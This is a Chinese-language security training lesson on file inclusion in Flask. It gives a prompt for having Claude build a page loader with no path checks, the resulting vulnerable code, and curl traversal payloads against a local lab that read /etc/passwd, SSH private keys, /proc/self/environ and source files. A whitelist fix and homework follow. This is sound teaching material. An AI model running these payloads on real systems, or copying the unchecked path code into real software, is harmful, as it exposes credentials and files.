# Day 6 - 文件包含漏洞（LFI/RFI）

## 一、页面部署提示词

> 学生将此提示词发给 Claude，即可生成带文件包含漏洞的功能：

```
在 Flask 中实现动态页面加载功能，要求：
1. 用户通过 GET /page?name=xxx 加载不同页面
2. 页面文件存放在 /pages/ 目录下
3. 根据用户传入的 name 拼接文件路径加载对应页面
4. 为了支持多种主题页面，路径灵活一点
5. 不需要做严格的路径校验，让系统更灵活
```

---

## 二、漏洞关键代码解释

### 漏洞：本地文件包含（LFI）

```python
# core/page_loader.py
PAGES_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), "pages")

def load_page(page_name):
    # ↓↓↓ 漏洞行：用户输入直接拼入文件路径，无任何过滤
    file_path = os.path.join(PAGES_DIR, page_name)

    # 尝试精确路径
    if os.path.exists(file_path):
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
        return {"success": True, "content": content}

    # 不存在则尝试加 .html 后缀
    file_path_html = file_path + '.html'
    if os.path.exists(file_path_html):
        with open(file_path_html, 'r', encoding='utf-8') as f:
            content = f.read()
        return {"success": True, "content": content}

    return {"success": False, "message": "页面不存在"}
```

**问题**：
- `page_name` 参数直接传给 `os.path.join`，未做路径遍历检测
- 没有白名单限制可访问的页面
- 文件内容直接返回给用户（有回显）

**不受限的路径**：
```
正常路径:   pages/help.html                    → 显示帮助页面
路径穿越:   pages/../../../etc/passwd          → 读取系统密码文件
源码读取:   pages/../core/auth.py              → 读取项目源代码
```

---

## 三、漏洞成因总结

| 漏洞 | 根本原因 | 攻击效果 |
|------|---------|---------|
| 本地文件包含 | 用户输入拼入路径，无 `../` 过滤 | 读取任意文件 |
| 无白名单 | 任何路径都可访问 | 读取系统配置、源码 |
| 有回显 | 文件内容直接返回 | 直接看到文件内容 |
| 无限制 | 未禁止特殊协议（RFI 风险） | 可扩展为远程包含 |

---

## 四、POC 代码

### POC 1：读取系统关键文件

```bash
# 读取 /etc/passwd（Linux 用户信息）
curl "http://127.0.0.1:5000/page?name=../../../etc/passwd" | grep "root:"

# 读取系统版本信息
curl "http://127.0.0.1:5000/page?name=../../../etc/issue"

# 读取主机名
curl "http://127.0.0.1:5000/page?name=../../../etc/hostname"
```

### POC 2：读取项目源代码

```bash
# 读取核心漏洞模块
curl "http://127.0.0.1:5000/page?name=../core/auth.py" | head -20

# 读取主应用
curl "http://127.0.0.1:5000/page?name=../app.py" | head -30

# 读取数据库文件
curl "http://127.0.0.1:5000/page?name=../../../data/users.db"
```

### POC 3：读取敏感配置文件

```bash
# Linux SSH 密钥
curl "http://127.0.0.1:5000/page?name=../../../root/.ssh/id_rsa"

# 应用配置
curl "http://127.0.0.1:5000/page?name=../.claude/skills.json"

# 环境变量（通过 /proc）
curl "http://127.0.0.1:5000/page?name=../../../proc/self/environ"
```

---

## 五、POC 代码详细解释

### POC 1 详解：路径穿越

```
请求: GET /page?name=../../../etc/passwd

路径计算过程:
  os.path.join("/root/ai-security-lab/pages", "../../../etc/passwd")
  → "/root/ai-security-lab/pages/../../../etc/passwd"
  → 规范化后 = "/etc/passwd"  (穿越了 pages/ 目录)
```

**路径穿越原理**：
```
pages/                  ← 基准目录
  ├── help.html         ← 正常访问
  ├── about.html        ← 正常访问
  └── (用户输入)        ← 攻击者控制

../                    → 回到 ai-security-lab/
../../                 → 回到 /root/
../../../etc/passwd    → /etc/passwd
```

**为什么需要 3 层 `../`？**
```
pages/ (第1层) → ../ → ai-security-lab/ (第1次穿越)
ai-security-lab/ (第2层) → ../ → /root/ (第2次穿越)
/root/ (第3层) → ../ → / (第3次穿越)
/ + etc/passwd = /etc/passwd ✅
```

---

## 六、修复方案

```python
# fix/page_loader_fix.py
import os

# 修复 1：白名单——只允许加载预定义的页面
ALLOWED_PAGES = {'help', 'about', 'contact', 'faq'}
PAGES_DIR = "pages"

def load_page_fixed(page_name):
    # 修复 1：白名单校验
    if page_name not in ALLOWED_PAGES:
        return {"success": False, "message": "页面不存在"}

    # 修复 2：使用安全的路径拼接（去掉扩展名，防止路径穿越）
    safe_name = os.path.basename(page_name)  # 只取文件名，去掉路径
    file_path = os.path.join(PAGES_DIR, safe_name + '.html')

    if os.path.exists(file_path):
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
        return {"success": True, "content": content}

    return {"success": False, "message": "页面不存在"}
```

**为什么 `os.path.basename()` 能防御？**
```
用户输入: ../../../etc/passwd
os.path.basename("../../../etc/passwd") → "passwd"

原本路径: pages/../../../etc/passwd → /etc/passwd  ← 穿越成功
修复后:   pages/passwd.html         → 只访问 pages/passwd.html  ← 无法穿越
```

---

## 七、课后作业

1. 在 `fix/` 目录创建 `page_loader_fix.py`，实现白名单修复
2. 尝试绕过 `os.path.basename()` 有什么方法？
3. 如果系统中需要动态加载用户上传的页面，该如何设计安全的方案？
4. （进阶）研究 PHP 中的 LFI 与 Python 中的 LFI 有何不同？
